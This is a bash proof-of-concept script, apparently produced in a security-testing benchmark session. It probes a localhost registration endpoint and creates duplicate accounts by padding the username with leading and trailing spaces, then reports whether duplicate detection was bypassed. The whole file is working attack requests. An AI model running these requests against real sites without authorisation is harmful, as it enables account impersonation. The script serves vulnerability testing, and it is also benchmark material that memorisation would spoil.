#!/bin/bash
# POC: Demonstrates username collision attack by bypassing duplicate detection using whitespace characters. Creates multiple accounts with the same effective username by appending spaces.
# Target: ./repo
# Created: 2025-12-01T16:05:49.777Z
# Session: benchmark-XBEN-069-24-minbd4jr

# Whitespace Bypass - Duplicate Username Detection POC
# This script demonstrates how attackers can bypass duplicate username detection
# by appending whitespace characters to the username parameter

TARGET_URL="http://localhost:8080/api/register.php"
BASE_USERNAME="whitespace_bypass_test"
TIMESTAMP=$(date +%s)

echo "[*] Whitespace Bypass - Duplicate Username Detection POC"
echo "[*] Target: $TARGET_URL"
echo "[*] Testing: Creating multiple accounts with whitespace variations"
echo ""

# Test 1: Register with base username
echo "[TEST 1] Registering initial account with username: $BASE_USERNAME"
RESPONSE1=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d "username=${BASE_USERNAME}&password=TestPass123&email=test${TIMESTAMP}@test.com")

HTTP_CODE1=$(echo "$RESPONSE1" | tail -n1)
BODY1=$(echo "$RESPONSE1" | head -n-1)

echo "HTTP Status: $HTTP_CODE1"
echo "Response: $BODY1"
echo ""

# Test 2: Attempt duplicate (should fail)
echo "[TEST 2] Attempting duplicate account with same username: $BASE_USERNAME"
RESPONSE2=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d "username=${BASE_USERNAME}&password=TestPass456&email=dup${TIMESTAMP}@test.com")

HTTP_CODE2=$(echo "$RESPONSE2" | tail -n1)
BODY2=$(echo "$RESPONSE2" | head -n-1)

echo "HTTP Status: $HTTP_CODE2"
echo "Response: $BODY2"
echo ""

# Test 3: Whitespace bypass - append single space
echo "[TEST 3] Whitespace bypass - Username with trailing space: '${BASE_USERNAME} '"
RESPONSE3=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d "username=${BASE_USERNAME}%20&password=TestPass789&email=space${TIMESTAMP}@test.com")

HTTP_CODE3=$(echo "$RESPONSE3" | tail -n1)
BODY3=$(echo "$RESPONSE3" | head -n-1)

echo "HTTP Status: $HTTP_CODE3"
echo "Response: $BODY3"
echo ""

# Test 4: Whitespace bypass - append multiple spaces
echo "[TEST 4] Whitespace bypass - Username with multiple trailing spaces: '${BASE_USERNAME}  '"
RESPONSE4=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d "username=${BASE_USERNAME}%20%20&password=TestPass999&email=spaces${TIMESTAMP}@test.com")

HTTP_CODE4=$(echo "$RESPONSE4" | tail -n1)
BODY4=$(echo "$RESPONSE4" | head -n-1)

echo "HTTP Status: $HTTP_CODE4"
echo "Response: $BODY4"
echo ""

# Test 5: Whitespace bypass - leading space
echo "[TEST 5] Whitespace bypass - Username with leading space: ' ${BASE_USERNAME}'"
RESPONSE5=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d "username=%20${BASE_USERNAME}&password=TestPass000&email=leading${TIMESTAMP}@test.com")

HTTP_CODE5=$(echo "$RESPONSE5" | tail -n1)
BODY5=$(echo "$RESPONSE5" | head -n-1)

echo "HTTP Status: $HTTP_CODE5"
echo "Response: $BODY5"
echo ""

# Summary
echo "=========================================="
echo "[*] VULNERABILITY SUMMARY"
echo "=========================================="
echo ""

if [ "$HTTP_CODE1" = "200" ] && [ "$HTTP_CODE2" != "200" ]; then
    echo "✓ TEST 1 PASSED: Initial registration successful (HTTP $HTTP_CODE1)"
    echo "✓ TEST 2 PASSED: Duplicate detection working (HTTP $HTTP_CODE2)"
else
    echo "✗ TEST 1/2 FAILED: Unexpected behavior"
fi

if [ "$HTTP_CODE3" = "200" ]; then
    echo "✓ TEST 3 PASSED: WHITESPACE BYPASS SUCCESSFUL - Trailing space bypassed detection (HTTP $HTTP_CODE3)"
    VULN_FOUND=1
else
    echo "✗ TEST 3 FAILED: Whitespace bypass did not work (HTTP $HTTP_CODE3)"
fi

if [ "$HTTP_CODE4" = "200" ]; then
    echo "✓ TEST 4 PASSED: Multiple trailing spaces also bypass detection (HTTP $HTTP_CODE4)"
    VULN_FOUND=1
else
    echo "✗ TEST 4 FAILED: Multiple spaces did not bypass (HTTP $HTTP_CODE4)"
fi

if [ "$HTTP_CODE5" = "200" ]; then
    echo "✓ TEST 5 PASSED: Leading space also bypasses detection (HTTP $HTTP_CODE5)"
    VULN_FOUND=1
else
    echo "✗ TEST 5 FAILED: Leading space did not bypass (HTTP $HTTP_CODE5)"
fi

echo ""
if [ "$VULN_FOUND" = "1" ]; then
    echo "[!] VULNERABILITY CONFIRMED: Username collision attack successful via whitespace bypass"
    exit 0
else
    echo "[!] Vulnerability not confirmed with current responses"
    exit 1
fi